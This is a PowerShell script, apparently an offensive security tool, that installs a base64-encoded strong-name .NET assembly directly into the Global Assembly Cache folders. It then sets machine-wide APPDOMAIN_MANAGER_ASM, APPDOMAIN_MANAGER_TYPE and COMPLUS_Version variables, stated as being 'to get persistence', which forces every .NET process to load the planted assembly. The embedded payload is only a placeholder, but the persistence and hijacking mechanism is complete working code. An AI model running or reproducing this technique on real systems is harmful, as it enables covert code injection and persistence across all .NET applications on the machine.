#Requires -RunAsAdministrator

<#
.USAGE
    Launch PowerShell as Administrator and execute this script.

.DESCRIPTION
    Author: Paul Laîné (@am0nsec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
    PS C:\> Import-Module .\Invoke-ClrHooking
    PS C:\> Invoke-ClrHooking
        [..snip..]

    PS C:\>
#>

Function Invoke-ClrHooking {
    Write-Host "[*] Paul Laîné (@am0nsec)"
    Write-Host "[*] Common Language Runtime Hook`n"

    # The strong-name assembly to install into the GAC
    [string]$assembly = "<base64 strong-name assembly>"
    [byte[]]$assemblyBytes = [System.Convert]::FromBase64String($assembly)

    # Load the assembly
    $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
    $information = ($assembly.FullName) -split ", "
    $runtimeVersion = $assembly.ImageRuntimeVersion
    $exportedType = $assembly.ExportedTypes

    # Get the name of the Assembly
    $assembyName = $information[0]
    Write-Host "[*] Installing: $assembyName"

    # Get the basic inforamtion used to install the assembly into the GAC
    $version = ($information[1] -split "=")[1]
    $culture = ($information[2] -split "=")[1]
    $publickey = ($information[3] -split "=")[1]

    if ($publickey -eq $null) {
        Write-Host "[-] Not a strong-name assembly"
        return
    }

    # Create folders
    $firstPath = "$env:windir\assembly\GAC_MSIL\"
    $secondPath = "$env:windir\Microsoft.NET\assembly\GAC_MSIL\"
    New-Item -ItemType "directory" -Path $firstPath -Name $assembyName -ErrorAction SilentlyContinue | Out-Null
    New-Item -ItemType "directory" -Path $secondPath -Name $assembyName -ErrorAction SilentlyContinue | Out-Null

    # Append the name of the name of assembly
    $firstPath += $assembyName + "\"
    $secondPath += $assembyName + "\"
    Write-Host "[*] .Net < 4.0 path: $firstPath"
    Write-Host "[*] .Net > 4.0 path: $secondPath"
    Write-Host ""

    # Forge the name of the second folder
    $folderName = $runtimeVersion.SubString(0, 4) + "_" + $version + "_"
    if ($culture -eq "neutral") { $folderName += "_" } else { $folderName +=  $culture}
    $folderName += $publickey

    # Create the second folder
    New-Item -ItemType "directory" -Path $firstPath -Name $folderName -ErrorAction SilentlyContinue | Out-Null
    New-Item -ItemType "directory" -Path $secondPath -Name $folderName -ErrorAction SilentlyContinue | Out-Null
    
    # Append the name of the folder
    $firstPath += $folderName + "\"
    $secondPath += $folderName + "\"
    Write-Host "[*] .Net < 2.0 folder: $firstPath"
    Write-Host "[*] .Net > 4.0 folder: $secondPath"
    Write-Host ""

    # Move the DLL into the created folder
    [System.IO.File]::WriteAllBytes("$firstPath\$exportedType.dll", $assemblyBytes)
    [System.IO.File]::WriteAllBytes("$secondPath\$exportedType.dll", $assemblyBytes)
    
    $asm = "$assembyName, Version=$version, Culture=$culture, PublicKeyToken=$publickey" 
    Write-Host "[*] COMPLUS_Version=" $runtimeVersion
    Write-Host "[*] APPDOMAIN_MANAGER_ASM=" $asm
    Write-Host "[*] APPDOMAIN_MANAGER_TYPE=" $exportedType
    
    # Change the system environment variables to get persistence
    $target = [System.EnvironmentVariableTarget]::Machine
    [System.Environment]::SetEnvironmentVariable("APPDOMAIN_MANAGER_ASM", $asm, $target)
    [System.Environment]::SetEnvironmentVariable("APPDOMAIN_MANAGER_TYPE", $exportedType, $target)
    [System.Environment]::SetEnvironmentVariable("COMPLUS_Version", $runtimeVersion, $target)
}